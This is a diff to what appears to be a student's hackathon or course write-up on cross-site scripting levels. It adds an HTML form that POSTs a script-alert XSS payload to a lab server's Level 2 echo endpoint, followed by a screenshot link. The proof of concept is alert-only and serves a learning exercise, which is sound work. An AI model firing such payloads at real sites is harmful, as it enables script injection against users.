@@ -50,6 +50,24 @@ web application, i.e., where the vulnerability is exploited (2 pts each)_
 
 +  Level 2:
 
+Included file `Level2.html`
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML Form</title>
+</head>
+<body>
+    <form action="http://waph-hackathon.eastus.cloudapp.azure.com/xss/level2/echo.php" method="POST">
+        Your input: <input name="input" value="&lt;script&gt;alert('Level 2-hacked by Amit Gaddi')&lt;/script&gt;">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
+
+```
 
 ![Screenshot](images/Screenshot2.png)   
 
